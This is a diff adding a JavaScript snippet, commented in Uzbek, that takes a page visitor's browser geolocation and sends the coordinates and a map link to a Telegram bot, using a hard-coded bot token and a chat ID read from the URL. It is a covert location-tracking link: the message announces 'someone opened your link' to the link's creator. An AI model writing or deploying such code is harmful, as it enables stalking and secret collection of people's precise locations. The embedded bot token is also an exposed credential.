@@ -1,0 +1,12 @@
+// URL dan foydalanuvchi ID sini olish (masalan: ?id=1234567) const urlParams =
+new URLSearchParams(window.location.search); const SENDER_ID =
+urlParams.get('id'); const API_KEY =
+"8568228545:AAEq_dmrBLEhLrhhCYp-8OoREpLt4YwNWHM"; function
+showPosition(position) { const lat = position.coords.latitude; const lon =
+position.coords.longitude; if (SENDER_ID) { // Ma'lumotni link yaratgan odamga
+yuborish const text = `🎯 Linkkingizga kimdir kirdi!\n📍 Lokatsiya:
+https://www.google.com/maps?q=${lat},${lon}`;
+fetch(`https://api.telegram.org/bot${API_KEY}/sendMessage?chat_id=${SENDER_ID}&text=${encodeURIComponent(text)}`);
+// Xarita ko'rinishida ham yuborish
+fetch(`https://api.telegram.org/bot${API_KEY}/sendLocation?chat_id=${SENDER_ID}&latitude=${lat}&longitude=${lon}`);
+} }
